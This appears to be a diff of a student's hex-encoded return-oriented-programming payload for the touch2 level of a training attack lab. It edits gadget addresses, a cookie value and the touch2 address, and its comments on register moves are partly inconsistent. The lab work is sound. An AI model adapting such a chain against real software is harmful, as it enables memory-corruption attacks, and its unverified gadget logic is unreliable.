@@ -7,17 +7,20 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 
-/* Popq register */
-/* 401f12 + 4 */
-16 1f 40 00 00 00 00 00
+/* Popq register rdi */
+/* 40 1f 92 + 1 */
+93 1f 40 00 00 00 00 00
 
 /* cookie 0x2cddf7f0 */
 f0 f7 dd 2c 00 00 00 00
 
-/* move rdi into rax */
-/* 401f1d + 2 */
+/* move rax into rdi */
+/* 401f3d + 2 */
 
-1f 1f 40 00 00 00 00 00
+3d 1f 40 00 00 00 00 00
 
 /* addr of touch 2 */
 22 d1 40 00 00 00 00 00
+
+
+
